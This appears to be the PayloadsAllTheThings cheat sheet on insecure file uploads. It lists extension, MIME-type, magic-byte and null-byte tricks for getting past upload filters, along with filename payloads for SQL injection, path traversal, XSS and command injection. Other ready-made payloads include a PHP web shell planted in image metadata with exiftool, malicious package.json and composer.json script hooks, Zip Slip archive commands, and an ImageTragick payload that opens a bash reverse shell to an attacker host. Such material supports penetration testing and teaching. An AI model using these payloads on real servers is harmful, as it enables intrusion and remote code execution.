# Upload Insecure Files

> Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.

## Summary

* [Tools](#tools)
* [Exploits](#exploits)
    * [Defaults extensions](#defaults-extensions)
    * [Upload tricks](#upload-tricks)
    * [Filename vulnerabilities](#filename-vulnerabilities)
    * [Picture compression](#picture-compression-)
    * [Configuration Files](#configuration-files)
    * [CVE - ImageMagick](#cve---imagemagick)
    * [CVE - FFMpeg](#cve---ffmpeg)
    * [ZIP Archive](#zip-archive)
    * [Jetty RCE](#jetty-rce)
* [References](#references)


## Tools
- [Fuxploider](https://github.com/almandin/fuxploider)
- [Burp > Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
- [ZAP > FileUpload AddOn](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/)


## Exploits

![file-upload-mindmap.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)

### Defaults extensions

* PHP Server
    ```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # Less known PHP extensions
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```
* ASP Server
    ```powershell
    .asp
    .aspx
    .config
    .cer and .asa # (IIS <= 7.5)
    shell.aspx;1.jpg # (IIS < 7.0)
    shell.soap
    ```
* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
* Perl: `.pl, .pm, .cgi, .lib`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`
* Node.js: `.js, .json, .node`

### Upload tricks

- Use double extensions : `.jpg.php, .png.php5`
- Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
- Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
- Null byte (works well against `pathinfo()`)
    * `.php%00.gif`
    * `.php\x00.gif`
    * `.php%00.png`
    * `.php\x00.png`
    * `.php%00.jpg`
    * `.php\x00.jpg`
- Special characters
    * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
    * Whitespace and new line characters
        * `file.php%20`
        * `file.php%0d%0a.jpg`
        * `file.php%0a`
    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
    * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
    * Multiple special characters: `file.jsp/././././.`
- Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
    * `Content-Type : image/gif`
    * `Content-Type : image/png`
    * `Content-Type : image/jpeg`
    * Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
    * Set the Content-Type twice: once for unallowed type and once for allowed.
- [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
    * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
        * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
        * JPG: `\xff\xd8\xff`
        * GIF: `GIF87a` OR `GIF8;`
    * Shell can also be added in the metadata
- Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")

### Filename vulnerabilities

Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.

- Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
- LFI/Path Traversal Payloads:  e.g. `image.png../../../../../../../etc/passwd` 
- XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
- File Traversal e.g. `../../../tmp/lol.png`
- Command Injection e.g. `; sleep 10;`

Also you upload:
- HTML/SVG files to trigger an XSS
- EICAR file to check the presence of an antivirus

### Picture Compression

Create valid pictures hosting PHP code. Upload the picture and use a **Local File Inclusion** to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.

- Picture Metadata, hide the payload inside a comment tag in the metadata.
- Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
    - [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): use createBulletproofJPG.py
    - [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php
    - [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php


### Picture with custom metadata

Create a custom picture and insert exif tag with `exiftool`. A list of multiple exif tags can be found at [exiv2.org](https://exiv2.org/tags.html)

```ps1
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

### Configuration Files

If you are trying to upload files to a :
- PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
- ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
- uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.

Configuration files examples
- [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
- [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
- [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)
- [\_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
- [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)

Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.
- package.json
    ```js
    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
    ```
- composer.json
    ```js
    "scripts": {
        "pre-command-run" : [
        "/bin/touch /tmp/pwned.txt"
        ]
    }
    ```

### CVE - ImageMagick

If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.

* ImageTragik example: Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
    ```powershell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context
    ```

More payloads in the folder `Picture ImageMagick`

### CVE - FFMpeg

FFmpeg HLS vulnerability


### ZIP archive

When a ZIP/archive file is automatically decompressed after the upload

* Zip Slip: directory traversal to write a file somewhere else
    ```python
    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15

    ln -s ../../../index.php symindex.txt
    zip --symlinks test.zip symindex.txt
    ```

### Jetty RCE

Upload the XML file to `$JETTY_BASE/webapps/`
* [JettyShell.xml - From Mikhail Klyuchnikov](https://raw.githubusercontent.com/Mike-n1/tips/main/JettyShell.xml)

## Labs 

* [Portswigger Labs on File Uploads](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)


## References

* [Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
* [BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA](https://secgeek.net/bookfresh-vulnerability/)
* [Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [La PNG qui se prenait pour du PHP, 23 février 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
* [File Upload restrictions bypass - Haboob Team](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
* [File Upload - Mahmoud M. Awali / @0xAwali](https://docs.google.com/presentation/d/1-YwXl9rhzSvvqVvE_bMZo2ab-0O5wRNTnzoihB9x6jI/edit#slide=id.ga2ef157b83_1_0)
* [IIS - SOAP](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
* [Arbitrary File Upload Tricks In Java - pyn3rd](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
* [File Upload - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
* [Injection points in popular image formats - Daniel Kalinowski‌‌ - Nov 8, 2019](https://blog.isec.pl/injection-points-in-popular-image-formats/)
* [A tip for getting RCE in Jetty apps with just one XML file! - Aug 4, 2022 - PT SWARM / @ptswarm](https://twitter.com/ptswarm/status/1555184661751648256/)
* [Jetty Features for Hacking Web Apps - September 15, 2022 - Mikhail Klyuchnikov](https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/)
* [Inyección de código en imágenes subidas y tratadas con PHP-GD  - Spanish Resource - hackplayers](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [PHP Internals Book - THE .PHPT FILE STRUCTURE](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
